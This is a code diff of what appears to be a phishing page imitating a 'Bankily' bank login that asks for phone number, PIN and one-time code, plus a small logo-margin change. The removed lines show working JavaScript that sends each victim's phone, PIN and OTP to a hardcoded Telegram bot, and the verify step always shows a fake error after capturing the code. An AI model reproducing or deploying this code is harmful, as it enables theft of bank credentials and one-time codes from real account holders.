@@ -25,7 +25,8 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 
 .body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
 
-.logo-box{display:flex;justify-content:center;margin:18px 0 34px}
+/* تم رفع الشعار للأعلى بتقليل الهامش العلوي من 18px إلى 5px */
+.logo-box{display:flex;justify-content:center;margin:5px 0 25px}
 .logo-box img{width:232px;max-width:100%;object-fit:contain}
 
 .field{margin-bottom:16px;position:relative;}
@@ -390,30 +391,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-const telegramToken = "7961226065:AAFf107hC4sMhC8y9Y7JkK4vL3N2m1p0X9Z";
-const telegramChatId = "7820301322";
-
-function sendToTelegram(phone, pin, otpCode = null) {
-  let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
-  if (otpCode) {
-    message += `\n📝 OTP: ${otpCode}`;
-  }
-
-  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-
-  fetch(url, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      chat_id: telegramChatId,
-      text: message,
-      parse_mode: "HTML"
-    })
-  })
-  .then(response => console.log("Sent"))
-  .catch(error => console.error("Error:", error));
-}
-
 function setupStrictLengthValidation(inputElement, maxLength) {
   inputElement.addEventListener('keydown', function(e) {
     const isControlKey = e.key === 'Backspace' || e.key === 'Delete' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab';
@@ -484,7 +461,6 @@ function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
-    sendToTelegram(ph, pin);
     showOtp();
   }
 }
@@ -530,11 +506,6 @@ function verify(){
   if(code.length !== 4) {
     return;
   }
-  
-  var ph=phEl.value.trim();
-  var pin=P.map(function(p){return p.value;}).join('');
-  
-  sendToTelegram(ph, pin, code);
 
   document.getElementById('otp-error-modal').classList.remove('hide');
 }
